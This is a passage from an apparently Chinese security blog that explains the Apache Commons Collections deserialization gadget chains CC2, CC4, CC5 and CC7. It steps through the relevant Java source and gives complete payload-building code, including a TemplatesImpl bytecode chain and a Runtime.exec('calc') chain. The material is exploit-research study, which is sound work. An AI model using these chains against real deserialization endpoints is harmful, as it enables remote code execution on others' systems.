<p>这里的grow方法其实无关紧要，if判断中的<font style="color:#080808;background-color:#ffffff;">queue.length在默认情况下是11，grow方法的作用就是</font><code>&lt;font style=&quot;color:#080808;background-color:#ffffff;&quot;&gt;// Double size if small; else grow by 50%&lt;/font&gt;</code><font style="color:#080808;background-color:#ffffff;">，就是如果i大于等于这个长度时，就会扩大这个队列的长度</font></p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">grow</span><span class="params">(<span class="type">int</span> minCapacity)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">oldCapacity</span> <span class="operator">=</span> queue.length;</span><br><span class="line">        <span class="comment">// Double size if small; else grow by 50%</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">newCapacity</span> <span class="operator">=</span> oldCapacity + ((oldCapacity &lt; <span class="number">64</span>) ?</span><br><span class="line">                                         (oldCapacity + <span class="number">2</span>) :</span><br><span class="line">                                         (oldCapacity &gt;&gt; <span class="number">1</span>));</span><br><span class="line">        <span class="comment">// overflow-conscious code</span></span><br><span class="line">        <span class="keyword">if</span> (newCapacity - MAX_ARRAY_SIZE &gt; <span class="number">0</span>)</span><br><span class="line">            newCapacity = hugeCapacity(minCapacity);</span><br><span class="line">        queue = Arrays.copyOf(queue, newCapacity);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>上面<code>siftUp</code>方法的代码如下，当队列不为空时，会根据comparator的情况调用不同的方法，但是两者大致的情况就是，将传入的参数和队列中数据进行比较，然后进行排序（大概是这样）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftUp</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (comparator != <span class="literal">null</span>)</span><br><span class="line">            siftUpUsingComparator(k, x);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            siftUpComparable(k, x);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftUpUsingComparator</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (k &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">parent</span> <span class="operator">=</span> (k - <span class="number">1</span>) &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">e</span> <span class="operator">=</span> queue[parent];</span><br><span class="line">            <span class="keyword">if</span> (comparator.compare(x, (E) e) &gt;= <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            queue[k] = e;</span><br><span class="line">            k = parent;</span><br><span class="line">        &#125;</span><br><span class="line">        queue[k] = x;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftUpComparable</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">        Comparable&lt;? <span class="built_in">super</span> E&gt; key = (Comparable&lt;? <span class="built_in">super</span> E&gt;) x;</span><br><span class="line">        <span class="keyword">while</span> (k &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">parent</span> <span class="operator">=</span> (k - <span class="number">1</span>) &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">e</span> <span class="operator">=</span> queue[parent];</span><br><span class="line">            <span class="keyword">if</span> (key.compareTo((E) e) &gt;= <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            queue[k] = e;</span><br><span class="line">            k = parent;</span><br><span class="line">        &#125;</span><br><span class="line">        queue[k] = key;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="vUdaI">反序列化流程分析</h3>
这里大家可以看到heapify，它调用了siftDown(i, (E) queue[i])，我们传入两个参数，所以size为2，二进制右移一位后就为0，所以这里只能遍历到`queue[0]`

<p>接下来调用的siftDown中的x就是templates</p>
<p>最后在siftDownUsingComparator中的<code>if (comparator.compare(x, (E) c) &lt;= 0)</code>，第一次遍历时相当于调用了<code>TransformingComparator.compare(queue[0],queue[1])</code>,也就调用了<code>invoketransform.transform(templates)</code>，调用了templates的newTransformer方法，这里就和前面接上了</p>
<blockquote>
<p>这里的k&lt;half，有点二分查找的感觉了</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">heapify();</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">heapify</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">            siftDown(i, (E) queue[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDown</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (comparator != <span class="literal">null</span>)</span><br><span class="line">            siftDownUsingComparator(k, x);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            siftDownComparable(k, x);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDownUsingComparator</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">half</span> <span class="operator">=</span> size &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (k &lt; half) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">child</span> <span class="operator">=</span> (k &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">c</span> <span class="operator">=</span> queue[child];</span><br><span class="line">            <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> child + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (right &lt; size &amp;&amp;</span><br><span class="line">                comparator.compare((E) c, (E) queue[right]) &gt; <span class="number">0</span>)</span><br><span class="line">                c = queue[child = right];</span><br><span class="line">            <span class="keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="number">0</span>)<span class="comment">//最后就是在这里执行代码</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            queue[k] = c;</span><br><span class="line">            k = child;</span><br><span class="line">        &#125;</span><br><span class="line">        queue[k] = x;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="loAfh">代码替换</h3>
下面是cc2链与cc4链存在差异的代码，可以看出，cc2相比于cc4，少了`ChainedTransformer`这个类的使用

<p>且cc2存在着cc1的老问题，已经不想多说了，还是构造时传入无用的东西，反射修改回来</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//CC4</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class="line"></span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//CC2</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        InvokerTransformer&lt;Object,Object&gt; invokerTransformer = <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class="line"></span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        Class&lt;? <span class="keyword">extends</span> <span class="title class_">TransformingComparator</span>&gt; aClass = transformingComparator.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">transformer</span> <span class="operator">=</span> aClass.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);</span><br><span class="line">        transformer.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        transformer.set(transformingComparator, invokerTransformer);</span><br><span class="line"></span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="VDJ24">最终代码</h2>
进行比较是，我们的templates应第一个add进去

<p>因为在对第一个对象进行transform方法调用时，我们传入的<code>Integer</code>类型，无 <code>newTransformer</code>方法，报错导致后面的<code>templates.transform</code>无法执行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(<span class="keyword">final</span> I obj1, <span class="keyword">final</span> I obj2)</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">O</span> <span class="variable">value1</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj1);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">O</span> <span class="variable">value2</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj2);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.decorated.compare(value1, value2);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>最终代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">tc</span> <span class="operator">=</span>templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\temporary\\Test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodes.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(transformingComparator);</span><br><span class="line"></span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> transformingComparator.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">transformer</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);</span><br><span class="line">        transformer.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        transformer.set(transformingComparator,invokerTransformer);</span><br><span class="line"></span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740708431644-08851d02-327c-414c-b3bc-f8f839076b57.png"></p>
<h2 id="X8o7s">自己的思考</h2>
之前说（下面），我在想，若传入一个存在`newTransformer`方法的类，是否也可以使恶意代码执行

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740704975146-97e0c299-9e90-4b71-931b-478868a85715.png"></p>
<p>找的过程很艰难，存在该方法的没有继承<code>Serializable</code>接口，且在add方法时，就会触发<code>newTransformer</code>方法，报错导致后续代码无法执行，因此尝试反射修改,但是这里失败了，因为queue有transient修饰，不带入序列化数据中</p>
<p>就这样结束了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">transient</span> Object[] queue;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>CC链</tag>
      </tags>
  </entry>
  <entry>
    <title>CC5链</title>
    <url>/2025/03/01/CC5%E9%93%BE/</url>
    <content><![CDATA[<h1 id="dXpnp">CC5</h1>
cc5的后半部分和之前是一样的，只是在调用LazyMap的get方法时，使用的是`TiedMapEntry`的`toString`方法，相当于是提供了一个新的入口

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734800821929-8a9e0e29-f2d6-495d-96d6-ce63b4c8122d.png"></p>
<h2 id="N47sb">CC5攻击链分析</h2>
<h3 id="FpvFg">调用get</h3>
这里`TiedMapEntry`的同`toString`方法调用了`getValue`方法，而`getValue`方法调用了map的`get`方法

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// TiedMapEntry toString</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> getKey() + <span class="string">&quot;=&quot;</span> + getValue();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>只需要将lazyMap放入<code>TiedMapEntry</code>中，然后调用其<code>toString</code>方法即可</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<h3 id="FID1K">调用toString</h3>
在`<font style="color:rgb(50, 50, 50);">BadAttributeValueExpException</font>`的`readObject`方法中，会调用传入类的toString方法，这里非常简单，也是只需要将`TiedMapEntry`传入`<font style="color:rgb(50, 50, 50);">BadAttributeValueExpException</font>`<font style="color:rgb(50, 50, 50);">中即可</font>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        ObjectInputStream.<span class="type">GetField</span> <span class="variable">gf</span> <span class="operator">=</span> ois.readFields();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">valObj</span> <span class="operator">=</span> gf.get(<span class="string">&quot;val&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (valObj == <span class="literal">null</span>) &#123;</span><br><span class="line">            val = <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">            val= valObj;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span></span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">            val = valObj.toString();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">            val = System.identityHashCode(valObj) + <span class="string">&quot;@&quot;</span> + valObj.getClass().getName();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><strong>最终代码如下</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);</span><br><span class="line">        </span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(tiedMapEntry);</span><br><span class="line"></span><br><span class="line">        serialize(badAttributeValueExpException);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>CC链</tag>
      </tags>
  </entry>
  <entry>
    <title>CC7链</title>
    <url>/2025/03/02/CC7%E9%93%BE/</url>
    <content><![CDATA[<h1 id="dNKB5">CC7</h1>
cc7与cc5大同小异，也是后面部分不变，变的只是入口的地方

<h2 id="YVQSz">CC7攻击链分析</h2>
<h3 id="UAfmG">思路分析</h3>
cc7这里的入口点使用了`Hashtable`

<p>这里我们简单分析一下，入口类是<code>Hashtable</code>的<code>readObject</code>，调用本身的<code>reconstitutionPut</code>方法，进入<code>reconstitutionPut</code>看一下（这里我们不分析怎么找到的可以利用的点），这里我们要调用<code>equals</code>方法，我们需要找到一个类的<code>equals</code>方法可以利用</p>
<p>在<code>AbstractMap.equals</code>中存在<code>m.get</code>方法，就可以接上之前的<code>LazyMap.get</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Hashtable.readObject</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">         <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        &#123;</span><br><span class="line">            ......</span><br><span class="line">            reconstitutionPut(table, key, value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Hashtable.reconstitutionPut</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">reconstitutionPut</span><span class="params">(Entry&lt;?,?&gt;[] tab, K key, V value)</span></span><br><span class="line">        <span class="keyword">throws</span> StreamCorruptedException</span><br><span class="line">    &#123;</span><br><span class="line">        ......</span><br><span class="line">        <span class="keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="literal">null</span> ; e = e.next) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>下面是这两个类的继承关系，后面的话会根据这两个地方进行做文章，因为逆向流程不太好讲，我们这里从正向开始分析</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//LazyMap</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LazyMap</span></span><br><span class="line">        <span class="keyword">extends</span> <span class="title class_">AbstractMapDecorator</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//HashMap</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HashMap</span>&lt;K,V&gt; <span class="keyword">extends</span> <span class="title class_">AbstractMap</span>&lt;K,V&gt;</span><br></pre></td></tr></table></figure>

<h3 id="GeLyE">AbstractMapDecorator#equals</h3>
当我们在`reconstitutionPut`中调用`e.key.equals(key)`时，我们想让这里调用`LazyMap.equals`，但实际上`LazyMap`并不存在`equals`方法，因此会找到他的父类`AbstractMapDecorator`，调用它的`equals`方法

<blockquote>
<p>并不是<code>AbstractMapDecorator</code>的<code>equals</code>有问题，而是当作一个桥梁去调用<code>AbstractMap</code>的<code>equals</code>方法</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//AbstractMapDecorator.equals</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (object == <span class="built_in">this</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> map.equals(object);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="JDvib">AbstractMap#equals</h3>
在`AbstractMapDecorator.equals`方法中，也调用了`map.equals(object)`，这次这里我们想让他调用`HashMap.equals`

<p>但因为<code>HashMap</code>中没有<code>equals</code>方法，会寻找它的父类<code>AbstractMap</code>，调用父类的<code>equals</code>方法，在该方法中存在<code>m.get(key)</code>，可以调用<code>LazyMap.get</code>方法，相信这里都不陌生了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// AbstractMap.equals</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">    ......</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();</span><br><span class="line">            <span class="keyword">while</span> (i.hasNext()) &#123;</span><br><span class="line">                Entry&lt;K,V&gt; e = i.next();</span><br><span class="line">                <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> e.getKey();</span><br><span class="line">                <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> e.getValue();</span><br><span class="line">                <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!(m.get(key)==<span class="literal">null</span> &amp;&amp; m.containsKey(key)))</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!value.equals(m.get(key)))</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">    ......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="Oj8m7">小结</h3>
最后顺一下，是要调用`LazyMap`的`equals`方法，然后`LazyMap`中没有`equals`方法，就会调用它的父类`AbstractMapDecorator`的`equals`方法，其中`map.equals(object)`，m是我们一个`HashMap`，但是`HashMap`并没有`equals`方法，所以还是找到其父类`AbstractMap`，去调用他的`equals`方法，从而调用`LazyMap`的`get`方法

<h2 id="F9PLA">调整</h2>
<h3 id="kzep2">put两次</h3>
<font style="color:rgb(51, 51, 51);">如果</font>`Hashtable`<font style="color:rgb(51, 51, 51);">中只有一个元素的话是不会走入判断的调用</font>`equals`<font style="color:rgb(51, 51, 51);">方法的，我们就可以通过</font>`Hashtable`<font style="color:rgb(51, 51, 51);">添加两个元素，第二个元素的我们传入一个我们构造的LazyMap对象</font>

<p><font style="color:rgb(51, 51, 51);">另一个是我们在最开始Hashtable.reconstitutionPut()方法中的必须hash相同（yso里面给出的是’yy’和’zZ’），也就是hash碰撞问题</font></p>
<blockquote>
<p>应该是下面这段代码的原因，比较之前的参数的hash与当前参数的hash，相同才会走进&amp;&amp;后的判断</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="literal">null</span> ; e = e.next) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

